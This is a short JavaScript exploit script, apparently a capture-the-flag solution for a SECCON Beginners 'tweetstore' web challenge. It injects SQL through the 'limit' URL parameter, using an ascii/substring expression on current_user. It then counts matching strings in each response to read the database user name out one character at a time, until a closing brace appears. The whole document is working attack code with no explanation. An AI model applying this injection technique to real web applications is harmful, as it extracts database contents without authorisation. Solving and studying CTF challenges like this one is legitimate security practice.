const axios = require('axios').default;


async function getFlagChar(pos) {
  const limit = `ascii(substring(current_user,${pos+1},1))-20`;
  const url = `https://tweetstore.quals.beginners.seccon.jp?search=&limit=${limit}`;
  const res = await axios.get(url);
  const cnt = (res.data.match(/Watch@Twitter/g) || []).length;
  return String.fromCharCode(cnt + 20);
}


async function solve() {
  let i = 0;
  let flag = '';
  while (flag.slice(-1) !== '}') {
    flag += await getFlagChar(i++);
    console.log(flag);
  }
}


solve();
